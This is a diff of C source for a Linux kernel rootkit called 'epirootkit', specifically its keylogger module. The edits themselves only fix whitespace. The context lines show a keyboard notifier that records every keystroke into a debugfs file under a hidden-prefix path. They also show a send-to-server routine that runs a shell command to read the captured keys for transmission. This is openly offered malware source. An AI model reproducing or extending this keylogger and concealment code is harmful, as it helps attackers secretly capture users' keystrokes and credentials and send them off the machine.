@@ -9,7 +9,7 @@
 #include "epirootkit.h"
 #include "io.h"
 
-#define BUF_LEN (PAGE_SIZE << 2) 
+#define BUF_LEN (PAGE_SIZE << 2)
 #define CHUNK_LEN 12
 
 // Keymap for each key (US keyboard layout)
@@ -158,8 +158,8 @@ static ssize_t keys_read(struct file *filp,
 }
 
 static int epikeylog_callback(struct notifier_block *nblock,
-                        unsigned long code,
-                        void *_param);
+                              unsigned long code,
+                              void *_param);
 
 // File operations structure for the debugfs file
 const struct file_operations keys_fops = {
@@ -194,7 +194,7 @@ static void keycode_to_string(int keycode, int shift_mask, char *buf) {
  *
  * This function is called on every key event and logs the key pressed
  * to the debugfs file.
- * 
+ *
  * @param nblock Notifier block structure
  * @param code Event code (e.g., KEY_PRESS, KEY_RELEASE)
  * @param _param Pointer to keyboard_notifier_param structure containing
@@ -253,9 +253,9 @@ int epikeylog_send_to_server(void) {
         return -ENOMEM;
     }
     snprintf(full_cmd, PATH_MAX, "cat /sys/kernel/debug/%sklg/keys", HIDDEN_PREFIX);
-    
+
     exec_str_as_command(full_cmd, true);
-    
+
     int readed_size = 0;
     char *keys_content;
     readed_size = _read_file(STDOUT_FILE, &keys_content);
